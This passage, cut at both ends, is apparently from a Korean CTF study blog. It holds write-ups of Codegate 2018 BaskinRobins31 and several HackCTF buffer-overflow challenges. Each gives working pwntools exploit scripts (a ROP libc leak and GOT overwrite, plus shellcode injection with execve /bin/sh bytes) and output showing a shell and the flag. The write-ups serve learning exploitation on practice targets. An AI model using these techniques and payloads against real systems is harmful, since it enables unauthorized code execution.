class="line">Searching for ROP gadget: &#39;pop rdi&#39; in: binary ranges</span><br><span class="line">0x00400bc3 : (b&#39;5fc3&#39;)pop rdi; ret</span><br><span class="line">0x0040087a : (b&#39;5f5e5ac3&#39;)pop rdi; pop rsi; pop rdx; ret</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>그래서 ropsearch 명령어를 이용해서 pop rdi; ret 가젯을 찾아서 이를 이용했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -h BaskinRobins31 </span><br><span class="line"></span><br><span class="line">BaskinRobins31:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 25 .bss          00000020  0000000000602090  0000000000602090  00002088  2**4</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>마지막으로 objdump를 이용해서 bss를 구했습니다. 나머지 got/plt/offset은 pwntools를 이용해서 구할 수 있습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭하고, 이를 이용해서 libc_base를 구한다.</li><li>read 함수를 이용해서 bss에 쉘을 넣어준다.</li><li>read 함수를 이용해서 read got를 system 함수로 체이닝 해준다.</li><li>read 함수를 호출하고, 이때 인자로는 bss를 넘겨준다. bss에는 <code>/bin/sh</code>가 들어있다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = e.bss()</span><br><span class="line">pppr = <span class="number">0x40087a</span></span><br><span class="line">pr = <span class="number">0x00400bc3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;pppr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pppr)))</span><br><span class="line">log.info(<span class="string">&#x27;bss : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line">log.info(<span class="string">&#x27;read_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;read_got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.info(<span class="string">&#x27;write_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;system_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_offset)))</span><br><span class="line">log.info(<span class="string">&#x27;read_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># BOF</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">184</span> <span class="comment"># Buffer + SFP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(1, read_got, 8);</span></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;(1-3)\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - read_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&#x27;system : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system)))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 이것 저것 확인한다고, 좀 지져분함.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;BaskinRobins31&#39;: pid 16607</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31&#x2F;BaskinRobins31&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] pppr : 0x40087a</span><br><span class="line">[*] bss : 0x602090</span><br><span class="line">[*] read_plt : 0x400700</span><br><span class="line">[*] read_got : 0x602040</span><br><span class="line">[*] write_plt : 0x4006d0</span><br><span class="line">[*] system_offset : 0x4f550</span><br><span class="line">[*] read_offset : 0x110140</span><br><span class="line">[*] libc_base : 0x7f621a53c000</span><br><span class="line">[*] system : 0x7f621a58b550</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00$ ls</span><br><span class="line">BaskinRobins31    exploit.py  flag</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;The Korean name of &quot;Puss in boots&quot; is &quot;My mom is an alien&quot;&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : flag{The Korean name of “Puss in boots” is “My mom is an alien”}</p></blockquote><hr><h2 id="PWN-D-5-2021-01-29"><a href="#PWN-D-5-2021-01-29" class="headerlink" title="PWN D+5 (2021.01.29)"></a>PWN D+5 (2021.01.29)<br></h2><hr><p>HackCTF Challenge : 내 버퍼가 흘러넘친다!!!</p><p><strong>이번에는 BOF 취약점을 이용해서 쉬운 쉘 코드 관련 문제를 하나 풀어보겠습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 s 변수를 14h 만큼 생성해주고, read 함수를 이용해서 name을 입력 받고, printf 함수로 출력하고, 또 gets 함수를 이용해서 s를 입력 받는 것을 볼 수 있습니다. 여기서 gets 함수로 입력값을 받고, 입력값의 대한 검증이 없기 때문에 BOF 취약점이 발생합니다. 그래서 그냥 name 변수에 쉘코드를 넣어주고, RET 값으로 name의 주소를 주면 된다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x080484f4 &lt;+41&gt;:push   0x804a060</span><br><span class="line">0x080484f9 &lt;+46&gt;:push   0x0</span><br><span class="line">0x080484fb &lt;+48&gt;:call   0x8048370 &lt;read@plt&gt;</span><br></pre></td></tr></table></figure><p><strong>gdb를 이용해서 name의 주소가 0x804a060라는 것을 알 수 있습니다..</strong><br></p><ul><li>시나리오</li></ul><ol><li>name 변수에 쉘 코드를 입력해준다. 쉘 코드는 그냥 검색해서 구했다.</li><li>BOF 취약점을 이용해서 RET를 name의 주수로 덮어준다.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3003</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Name : &quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(<span class="number">0x804a060</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input : &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python prob.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3003: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;1_l0v3_70p_pwn3r_m4lhyuk&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}</p></blockquote><hr><p>HackCTF Challenge : x64 Buffer Overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s, envp);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 scanf 함수를 이용해서 s를 입력 받고 있습니다. 하지만 길이에 대한 검증이 없어 BOF 취약점이 발생합니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callMeMaybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *path; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  path = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">  v2 = <span class="string">&quot;-p&quot;</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/bash&quot;</span>, &amp;path, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>그리고 다른 함수가 뭐가 있나 보니 callMeMaybe라는 함수가 존재했습니다. 해당 함수를 실행시키면 execve 함수를 이용해서 쉘을 실행 시키는 것을 볼 수 있습니다. 그러니 BOF 취약점을 이용해서 RET를 ccallMeMaybe 함수의 주소로 덮으면 될 거 같습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3004</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">280</span></span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python 64bof_basic.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;64b17_b0f_15_51mpl3_700&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{64b17_b0f_15_51mpl3_700}</p></blockquote><hr><p>HackCTF Challenge : x64 Simple_size_BOF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-6D30h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buf: %p\n&quot;</span>, &amp;v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 printf 함수를 이용해서 v4의 주소를 출력하고, gets 함수를 이용해서 v4의 값을 입력하고 있는 것을 볼 수 있습니다. 이번 문제도 gets 함수로 입력을 받고, 검증 로직이 없어 BOF 취약점이 발생합니다. 그래서 쉘을 실행시켜주는 함수가 있나 확인해 보니 없었고, ROP를 하려고 보호 기법도 확인해보니 아무 것도 되어 있지 않아 그냥 쉘 코드를 박아주기로 했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc7b644760</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc99272180</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7fffcba94780</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ </span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 실행해보니 buf의 주소가 계속 바뀌는 것을 알 수 있습니다. 아마 ASLR이 적용되어 있는 거 같습니다. 하지만 그냥 바이너리가 실행되는 동시에 출력되는 buf의 주소를 가져와서 사용하면 됩니다. 마찬가지로 64 비트 쉘 코드도 검색해서 구했습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3005</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">5</span>:], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">27960</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buf + sfp - shell_code_length</span></span><br><span class="line">payload += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_size_bof.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done</span><br><span class="line">[*] buf addr : 0x7fff99022510</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;s000000_5m4ll_4nd_5m4ll_51z3_b0f&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}</p></blockquote><hr><p>HackCTF Challenge : Simple_Overflow_ver_2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+13h] [ebp-89h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [esp+14h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+94h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">121</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data : &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot; %[^\n]s&quot;</span>, s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !(i &amp; <span class="number">0xF</span>) )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%p: &quot;</span>, &amp;s[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %c&quot;</span>, (<span class="keyword">unsigned</span> __int8)s[i]);</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">16</span> == <span class="number">15</span> )</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAgain (y/n): &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( __isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;v5) &amp;&amp; (v5 == <span class="number">121</span> || v5 == <span class="number">89</span>) );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 scanf 함수를 이용해서 s의 값을 입력해주고, printf로 입력 값을 출력해주고, <code>&quot;Again (y/n): &quot;</code>를 출력해서 한 번 더 입력할 거냐고 묻는다. <code>y</code>를 누르면 다시 입력을 하고, <code>n</code>을 누르면 종료를 합니다. 하지면 s의 크기는 136인데 입력은 무제한으로 받을 수 있어 BOF 취약점이 발생합니다. 그래서 그냥 이번 문제도 shell code를 s에 넣어주고, ret를 s의 주소로 덮어주면 쉘을 딸 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3006</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span 